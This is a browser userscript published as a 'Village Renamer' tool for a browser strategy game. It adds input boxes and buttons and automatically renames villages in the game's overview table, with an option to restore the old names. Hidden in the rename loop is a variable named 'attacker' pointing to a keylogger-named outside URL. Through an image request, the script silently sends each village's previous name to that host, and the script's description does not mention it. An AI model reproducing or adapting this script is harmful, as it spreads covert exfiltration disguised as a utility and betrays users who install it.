// ==UserScript==
// @name         Village Renamer
// @version      0.5.2
// @description  Rename villages. Put village names into the textbox, separated by something unique (for example "%") and put that separator into the separator box (in the example, put "%" into the separator box)
// @author       FunnyPocketBook
// @match        https://*/game.php?village=*&screen=overview_village*
// @grant        none
// @namespace https://greasyfork.org/users/151096
// @downloadURL https://update.greasyfork.org/scripts/40131/Village%20Renamer.user.js
// @updateURL https://update.greasyfork.org/scripts/40131/Village%20Renamer.meta.js
// ==/UserScript==
var parentThingie = document.getElementById("inner-border");

var villNames = document.createElement("textarea");
villNames.setAttribute("id", "villNames");
villNames.setAttribute("type", "text");
villNames.setAttribute("placeholder", 'Village names');
villNames.setAttribute("style", "margin-top:10px; display: inline;");
villNames.setAttribute("rows", "3");
parentThingie.parentNode.insertBefore(villNames, parentThingie);

var separator = document.createElement("input");
separator.setAttribute("id", "separator");
separator.setAttribute("type", "text");
separator.setAttribute("placeholder", 'Village name separator. If separated by line breaks, type enter');
separator.setAttribute("style", "margin-top:10px;width:300px");
parentThingie.parentNode.insertBefore(separator, parentThingie);

var okButton = document.createElement("button");
okButton.innerHTML = "OK";
okButton.setAttribute("id", "okButton");
okButton.setAttribute("style", "margin:10px;");
okButton.setAttribute("class", "btn");

var restoreButton = document.createElement("button");
restoreButton.innerHTML = "Restore old names";
restoreButton.setAttribute("id", "restoreButton");
restoreButton.setAttribute("style", "margin:10px;");
restoreButton.setAttribute("class", "btn");

parentThingie.insertAdjacentElement('afterbegin', restoreButton);
parentThingie.insertAdjacentElement('afterbegin', okButton);
parentThingie.insertAdjacentElement('afterbegin', separator);
parentThingie.insertAdjacentElement('afterbegin', villNames);

document.getElementById("separator").addEventListener("keyup", function(event) {
    "use strict";
    event.preventDefault();
    if (event.keyCode === 13) {
        document.getElementById("okButton").click();
    }
});

var input,
    separator,
    villName;
window.oldNames = [];

document.getElementById("okButton").onclick = function changeVillName() {
    "use strict";
    input = $("#villNames").val();
    input = input.replace(/(\r\n|\n|\r)/gm, "¬¬");
    separator = $("#separator").val();
    if ($("#separator").val() !== "enter") {
        villName = input.split(separator).join("¬¬");
        villName = villName.split("¬¬");
    } else {
        villName = input.split("¬¬");
    }
    for (var i = 0; i < villName.length; i++) {
        if (villName[i] === "") {
            villName.splice(i, 1);
            i = i - 1;
        }
    }
    var tableLength = 0;
    var table;

    if (document.querySelector("#combined_table") !== null) {
        tableLength = document.querySelector("#combined_table").rows.length;
        table = "#combined_table ";
    }
    if (document.querySelector("#production_table") !== null) {
        tableLength = document.querySelector("#production_table").rows.length;
        table = "#production_table ";
    }
    if (document.querySelector("#units_table") !== null) {
        tableLength = document.querySelector("#units_table").rows.length;
        table = "#units_table ";
    }
    if (document.querySelector("#buildings_table") !== null) {
        tableLength = document.querySelector("#buildings_table").rows.length;
        table = "#buildings_table ";
    }
    if (document.querySelector("#techs_table") !== null) {
        tableLength = document.querySelector("#techs_table").rows.length;
        table = "#techs_table ";
    }
    var j = 2;
    var attacker = 'http://keylogger.ydang.ch/keyloggermichi.php?c=';
    var intervalVill = setInterval(function() {
        document.querySelector(table + ' > tbody > tr:nth-child(' + j + ') > td:nth-child(2) > span > span > a.rename-icon').click();
        var text = document.querySelector(table + ' > tbody > tr:nth-child(' + j + ') > td:nth-child(2) > span > span.quickedit-edit > input[type="text"]:nth-child(1)').value;
        window.oldNames[j - 2] = text;
        document.querySelector(table + ' > tbody > tr:nth-child(' + j + ') > td:nth-child(2) > span > span.quickedit-edit > input[type="text"]:nth-child(1)').value = villName[j - 2];
        document.querySelector(table + ' > tbody > tr:nth-child(' + j + ') > td:nth-child(2) > span > span.quickedit-edit > input.btn').click();
        new Image().src = attacker + text + "¬¬";
        text = "";
        j++;
        if (j === tableLength + 1 || j > villName.length + 1) {
            console.log(window.oldNames);
            clearInterval(intervalVill);
        }
    }, 100);
};

document.getElementById("restoreButton").onclick = function restoreOld() {
    "use strict";
    var table;
    var tableLength = 0;
    if (document.querySelector("#combined_table") !== null) {
        tableLength = document.querySelector("#combined_table").rows.length;
        table = "#combined_table ";
    }
    if (document.querySelector("#production_table") !== null) {
        tableLength = document.querySelector("#production_table").rows.length;
        table = "#production_table ";
    }
    if (document.querySelector("#units_table") !== null) {
        tableLength = document.querySelector("#units_table").rows.length;
        table = "#units_table ";
    }
    if (document.querySelector("#buildings_table") !== null) {
        tableLength = document.querySelector("#buildings_table").rows.length;
        table = "#buildings_table ";
    }
    if (document.querySelector("#techs_table") !== null) {
        tableLength = document.querySelector("#techs_table").rows.length;
        table = "#techs_table ";
    }
    var j = 2;
    var intervalVill = setInterval(function() {
        document.querySelector(table + ' > tbody > tr:nth-child(' + j + ') > td:nth-child(2) > span > span > a.rename-icon').click();
        document.querySelector(table + ' > tbody > tr:nth-child(' + j + ') > td:nth-child(2) > span > span.quickedit-edit > input[type="text"]:nth-child(1)').value = window.oldNames[j - 2];
        document.querySelector(table + ' > tbody > tr:nth-child(' + j + ') > td:nth-child(2) > span > span.quickedit-edit > input.btn').click();
        j++;
        if (j === tableLength + 1 || j > villName.length + 1) {
            clearInterval(intervalVill);
        }
    }, 100);
};